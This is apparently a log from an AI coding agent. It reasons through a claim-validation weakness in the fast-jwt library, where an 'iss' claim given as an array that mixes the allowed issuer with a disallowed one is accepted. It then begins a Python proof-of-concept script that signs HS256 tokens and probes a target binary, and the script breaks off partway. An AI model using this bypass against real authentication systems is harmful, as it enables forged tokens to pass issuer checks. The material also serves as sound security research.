2026-09-05T14:23:03.553691Z ERROR codex_core::util: ReasoningSummaryDelta without active item
{"type":"item.completed","item":{"id":"item_19","type":"reasoning","text":"The harness: `createVerifier({ key, allowedIss: [\"https://valid-iss\"] })`. So the target validates the `iss` claim against allowed value `https://valid-iss` using exact string match (`exactStringClaimMatcher`: `allowed === actual`).\n\nNow where's the weakness? The verifier validates `iss` only if `iss` claim is present in the payload (`if (!(claim in payload)) continue;`). So a token without `iss` would pass — but the task explicitly says: \"A token that contains only claims the target does not validate is accepted by any verifier and does not demonstrate the weakness.\" Also a missing `iss` claim would be accepted by a strict verifier too? Actually RFC 7519 says `iss` is optional. Hmm, but the target's policy is `allowedIss` — a strict verifier with the same policy... if the claim is missing, both would accept since the claim is optional. Not the weakness.\n\nThe weakness must be in value form. Think about fast-jwt's validateClaimValues for `iss`:\n\n```js\nconst value = payload[claim];\nconst arrayValue = Array.isArray(value);\nconst values = arrayValue ? value : [value];\n...\nvalidateClaimType(values, claim, array, type === \"date\" ? \"number\" : \"string\");\nif (type === \"date\") { ... } else {\n  validateClaimValues(values, claim, allowed, arrayValue);\n}\n```\n\nFor `iss`, `array` is false (only `aud` has `array: true`). `validateClaimType` with array=false: failure message \"The iss claim must be a string.\" Check: `values.map(v => typeof v).some(t => t !== type)` → throws invalidClaimType if any value isn't a string. Note: if `iss` is an array like `[\"https://valid-iss\"]`, arrayValue = true, values = [\"https://valid-iss\"], all strings → type check passes (even though array=false for iss, the check still operates over array elements!). Then `validateClaimValues(values, claim, allowed, arrayValue)`: `values.some(v => allowed.some(a => a.test(v)))` → \"https://valid-iss\" matches → accepted!\n\nSo `iss: [\"https://valid-iss\"]` would be accepted by fast-jwt. But is that rejected by a strict verifier? RFC 7519 says `iss` is a StringOrURI — an array is not a valid value form for `iss`. A strict verifier would reject the type. Hmm, but \"the claim value it carries must be one that a strict verifier would reject under the same claim policy\" — an array for iss is a type violation. The task says: \"presented in a value form that the target nonetheless accepts\". So value form = array containing an allowed value? But wait — the requirement says: \"The token carries, for at least one claim the target validates, a value that the target's own policy does not allow, presented in a value form that the target nonetheless accepts.\"\n\nSo the token must carry a value that the policy does NOT allow. With `iss: [\"https://valid-iss\"]`, the carried value IS the allowed value, just in array form. That doesn't carry a disallowed value.\n\nBetter: `iss: [\"https://valid-iss\", \"https://evil-iss\"]` — carries a disallowed value (\"https://evil-iss\") mixed in an array. fast-jwt: `values.some(...)` → any match passes, so it accepts because at least one matches. The message even says \"None of iss claim values are allowed\" — i.e., it requires only SOME to match. A strict verifier with `allowedIss` policy would reject because the array contains a disallowed issuer, or because `iss` must be a single string, not an array. \n\nHmm wait, but actually let me reconsider — the known fast-jwt CVE: GHSA... \"fast-jwt auditor validation bypass\" — the `aud` claim. Actually there was a recent fix: fast-jwt 5.0.6? Let me recall the recent CVE: CVE-2025-30144? That's fast-jwt \"Missing iss validation\"? Hmm no.\n\nActually the relevant known issue is about `aud`: fast-jwt checks `values.some(...)` for aud arrays — but RFC 7519 says for aud, \"each principal intended to process the JWT MUST identify itself with a value in the audience claim\" — i.e., ALL values should be checked, or at least one. Actually RFC 7519 section 4.1.3: \"If the principal processing the claim does not identify itself with a value in the `aud` claim when this claim is present, then the JWT MUST be rejected.\" So `some` semantics is actually correct for `aud` per RFC! Hmm.\n\nBut for `iss`, an array is not spec-conformant at all: iss is a StringOrURI (single string). A strict verifier would reject `iss` as an array regardless of contents. And with `[\"https://valid-iss\", \"https://evil-iss\"]`, it carries a value (\"https://evil-iss\") that the policy does not allow.\n\nThis fits the task description perfectly: \"present that claim in a value form the target accepts even though it includes a value the policy does not allow — this is the value form a strict, RFC 7519-conformant verifier rejects.\"\n\nWait, but there's a subtlety: does the fixed build reject it? Choose final token: `iss: [\"https://valid-iss\", \"https://attacker-iss\"]` — deterministic selection, prefer the mixed array form; fall back based on discovery? On fixed builds, the array form will be rejected during discovery, so no candidate would be accepted... then fall back to the primary candidate anyway (mixed array). Deterministic given the same binary responses.\n\n4. Final run with chosen token, report result exactly.\n\nAlso need exp/iat? The verifier config only has `key` and `allowedIss`. All deterministic given probe outcomes, and independent of the final run.\n\n   Wait — `[good]` doesn't carry a disallowed value, so it doesn't demonstrate weakness; but it's only a fallback and would essentially never be selected on the vulnerable build since `[good, evil]` is accepted. Probes: 2 (evil string), 5 ([evil]), 6 ([good,evil]), 7 ([evil,good]).\n\n4. Final run and report per contract.\n\nPayload also includes fixed `sub` and `iat`? iat numeric is fine. RFC 7519 defines\n\\\"iss\\\" as a single StringOrURI, so a strict verifier rejects the array form.\n\nThe script is a pure construct-and-report tool: it probes the binary with a\nsmall bounded set of signed tokens, deterministically selects the trigger\ntoken from the discovery results, performs one final verification run, and\nreports the binary's own verdict JSON exactly. A rejection is a legitimate\noutcome and is reported, never treated as a script failure.\n\\\"\\\"\\\"\n\nimport argparse\nimport base64\nimport hashlib\nimport hmac\nimport json\nimport re\nimport signal\nimport subprocess\nimport sys\nimport time\n\n# Secret is generated in-script at runtime (fixed literal => deterministic\n# across repeated runs; nothing is read from disk or the environment).\nSECRET = \\\"poc-hs256-runtime-secret-9f2c71\\\"\n\n# Fallback allowed-issuer used only if static extraction from the binary\n# fails; the primary source is the verifier configuration embedded in the\n# target binary itself.\nFALLBACK_ALLOWED_ISS = \\\"https://valid-iss\\\"\n\nDISALLOWED_ISS = \\\"https://evil-iss\\\"\n\nFIXED_IAT = 1700000000\nFIXED_SUB = \\\"poc\\\"\n\n\ndef b64url(data: bytes) -> str:\n    return base64.urlsafe_b64encode(data).rstrip(b\\\"=\\\").decode(\\\"ascii\\\")\n\n\ndef sign_jwt(payload: dict, secret: str) -> str:\n    header = {\\\"alg\\\": \\\"HS256\\\", \\\"typ\\\": \\\"JWT\\\"}\n    head = b64url(json.dumps(header, separators=(\\\",\\\", \\\":\\\")).encode())\n    body = b64url(json.dumps(payload, separators=(\\\",\\\", \\\":\\\")).encode())\n    sig = b64url(hmac.new(secret.encode(), f\\\"{head}.{body}\\\".encode(),\n                          hashlib.sha256).digest())\n    return f\\\"{head}.{body}.{sig}\\\"\n\n\ndef run_binary(binary: str, token: str, secret: str, timeout: float):\n    \\\"\\\"\\\"Run the target once.
